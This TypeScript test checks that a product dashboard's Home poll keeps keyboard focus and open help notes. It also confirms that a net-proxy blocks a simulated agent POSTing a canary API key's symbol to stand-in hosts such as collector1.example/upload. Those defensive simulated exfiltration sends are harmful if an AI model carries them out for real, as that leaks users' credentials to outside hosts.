/**
 * product-poll-focus.test — the product page's poll keeps your place on Home
 * and gives the keyboard focus back after a changed answer, across the REAL
 * components (dashboard.md §4.25 *The poll keeps your place*, *The poll
 * keeps the focus*). Mandu-new.
 *
 * Until 2026-10-11 Home's hero and its Running now list were drawn again at
 * every 10 s poll, whatever the answer: a focused Details link and the
 * hero's "?" fell to <body>, and the note the "?" opened closed (seen in a
 * headless Chromium). Here a real ArbiterServer runs at the `secrets` axes,
 * the net-proxy runs in its production wiring, and a real DashboardServer
 * serves the product page (its own index.html and home.js in jsdom), signed
 * out:
 *
 *   P1  the net-proxy stops a send of a registered key: a real session asks
 *       on Home, under Running now, with its Details link and the hero's "?";
 *   P2  a poll with the same answer: Details keeps the focus and its row is
 *       the same node; the "?" opened keeps the focus and its note stays
 *       open;
 *   P3  the agent sends to a second host, so the poll's answer changed: the
 *       row is drawn again ("2 questions waiting for you") and the
 *       session's own new Details link has the focus;
 *   P4  the "?" opened, the agent sends to a third host: the hero is drawn
 *       again, its new "?" has the focus with its note open;
 *   P5  nothing rejects unhandled; the oracle: neither `/api/home` (signed
 *       out or in) nor any rendered page carries the key's value, and none
 *       carries a token; nothing was forwarded.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer, type ApprovalsArbiter } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { waitWhile } from "../../dashboard/test/unit/page-wait.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";

stateAxes("secrets");

const KEY_VALUE = "sk_live_productPollFocusStackCanary0001";
const SESSION = "1791300000-0530";
const CSRF = { "X-Mandu-Control": "1" };

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

/** The page's poll (what its 10 s timer and a return to the tab run), and a
 *  wait until each read it made has answered and been drawn: a poll that
 *  brings nothing new draws nothing, so there is nothing else to wait on. */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
async function pollOnce(doc: any): Promise<void> {
  const w = doc.defaultView;
  const inner = w.fetch;
  let out = 0;
  let home = false;
  // A read counts as done a task after its answer came: the page reads it
  // and draws (or makes its next read) in the microtasks before that.
  const done = () => setTimeout(() => { out--; }, 0);
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  w.fetch = (url: string, init: any) => {
    out++;
    if (/\/api\/home$/.test(String(url))) home = true;
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    return inner(url, init).then((res: any) => (done(), res), (e: unknown) => { done(); throw e; });
  };
  try {
    doc.dispatchEvent(new w.Event("visibilitychange"));
    await waitWhile(() => !home || out > 0);
    assert.ok(home && out === 0, "the poll read Home and drew what each read brought");
  } finally {
    w.fetch = inner;
  }
}
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const detailsOf = (doc: any) => [...doc.querySelectorAll("#home-agents a")].find((a: any) => a.dataset.session === SESSION && a.textContent === "Details") as any;
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const heroHelp = (doc: any) => doc.querySelector("#hero-facts .help-btn") as any;
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const isOpen = (btn: any) => btn.getAttribute("aria-expanded") === "true" && btn.ownerDocument.getElementById(btn.getAttribute("aria-controls")).hidden === false;

test("the product page's poll keeps your place on Home, and a changed answer gives the focus back to the same control (real arbiter, net-proxy, dashboard, served page)", { timeout: 180_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-poll-focus-"));
  const home = join(tmp, "home");
  mkdirSync(join(home, "proj"), { recursive: true });
  const socketPath = join(tmp, "arbiter.sock");
  const humanPath = humanSockIn(tmp);
  const arbiter = new ArbiterServer({
    socketPath, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanPath,
    dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, // the `secrets` axes, stated
  });
  await arbiter.listen();

  // Production wiring of the net-proxy's arbiter (net-proxy/src/server-main.ts).
  const netClient = new ArbiterClient(socketPath);
  await netClient.connect();
  const netHuman = new ArbiterClient(humanPath);
  const forwarded: string[] = [];
  const proxy = new NetProxy({
    arbiter: new ArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
    sessionId: SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a stopped send must never be forwarded");
    },
    log: () => {},
  });
  const proxyPort = await proxy.listen(0);

  const gate = new ArbiterClient(socketPath); await gate.connect();
  const admin = new ArbiterClient(join(tmp, "admin.sock")); await admin.connect();
  const approvalsArbiter: ApprovalsArbiter = {
    egressApprovals: (status) => admin.egressApprovals(status),
    resolveEgressApproval: (approvalId, approve, scope) => admin.resolveEgressApproval(approvalId, approve, scope),
  };
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath, humanSocketPath: humanPath }),
    approvalsArbiter,
    fileBrowserHome: home,
    configEnv: { MANDU_HOME: join(tmp, "mandu-home") },
    log: () => {},
  });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  const rendered: [string, string][] = [];
  const unhandled: string[] = [];
  const onUnhandled = (e: unknown) => unhandled.push(String((e as Error)?.message ?? e));
  process.on("unhandledRejection", onUnhandled);
  try {
    // ── P1: a stopped send asks on Home ───────────────────────────────────────
    const env = join(home, "proj", ".env");
    writeFileSync(env, `STRIPE_KEY=${KEY_VALUE}\n`);
    const reg = await gate.registerSecret({ path: env, sessionKey: SESSION });
    const keySym = /\$MDU:nomodel_Read\[[0-9a-f]+\]\.STRIPE_KEY/.exec(reg.twin ?? "")?.[0];
    assert.ok(keySym, `the key has its own symbol: ${JSON.stringify(reg)}`);
    const send = async (host: string) => {
      const res = await viaProxy(proxyPort, `http://${host}/upload`, `k=${keySym}`);
      assert.equal(res.status, 403, `the send to ${host} is stopped: ${res.body}`);
      assert.ok(!res.body.includes(KEY_VALUE), "the agent's answer carries no value");
    };
    await send("collector1.example");
    assert.deepEqual(forwarded, []);

    await servedProductPage(base, "/", (doc) => !!detailsOf(doc) && !!heroHelp(doc), async (doc) => {
      // ── P2: the same answer draws nothing ─────────────────────────────────
      const row = detailsOf(doc).closest(".row");
      detailsOf(doc).focus();
      await pollOnce(doc);
      assert.equal(detailsOf(doc).closest(".row"), row, "the row was not drawn again");
      assert.equal(doc.activeElement, detailsOf(doc), "Details keeps the focus");
      const help = heroHelp(doc);
      help.focus();
      help.click();
      assert.ok(isOpen(help));
      await pollOnce(doc);
      assert.equal(heroHelp(doc), help, "the hero was not drawn again");
      assert.equal(doc.activeElement, help);
      assert.ok(isOpen(help), "the note the reader opened stays open");

      // ── P3: a changed answer: the session's own new Details ───────────────
      detailsOf(doc).focus();
      await send("collector2.example");
      await pollOnce(doc);
      assert.match(detailsOf(doc).closest(".row").textContent, /2 questions waiting for you/);
      assert.notEqual(detailsOf(doc).closest(".row"), row, "the row was drawn again");
      assert.equal(doc.activeElement, detailsOf(doc), "the session's own Details has the focus, never <body>");

      // ── P4: the "?" opened, the hero drawn again ──────────────────────────
      const before = heroHelp(doc);
      before.focus();
      before.click();
      const headline = doc.getElementById("hero-headline").textContent;
      await send("collector3.example");
      await pollOnce(doc);
      assert.notEqual(doc.getElementById("hero-headline").textContent, headline, "the hero says the new count");
      assert.notEqual(heroHelp(doc), before, "the hero was drawn again");
      assert.equal(doc.activeElement, heroHelp(doc), "its new \"?\" has the focus");
      assert.ok(isOpen(heroHelp(doc)), "with its note open again");
      rendered.push(["Home signed out", doc.documentElement.outerHTML]);
    });
    assert.equal((await admin.egressApprovals("pending")).length, 3, "three questions wait: nothing was answered");

    // ── P5: nothing rejected unhandled; the oracle ───────────────────────────
    assert.deepEqual(unhandled, [], "no unhandled rejection in the page");
    assert.deepEqual(forwarded, [], "nothing was forwarded");
    const bodies: [string, string][] = [
      ["/api/home", await (await pageFetch(`${base}/api/home`)).text()],
      ["/api/home signed in", await (await pageFetch(`${base}/api/home`, { headers: { ...CSRF, Cookie: dashboard.adminCookie() } })).text()],
      ...rendered,
    ];
    for (const [where, body] of bodies) {
      assert.ok(!body.includes(KEY_VALUE), `CONFIDENTIALITY VIOLATION: the key's value is in ${where}`);
      assert.doesNotMatch(body, /\$MDU/, `${where} carries no token`);
    }
  } finally {
    process.off("unhandledRejection", onUnhandled);
    await dashboard.close();
    await proxy.close();
    netClient.close(); netHuman.close();
    gate.close(); admin.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
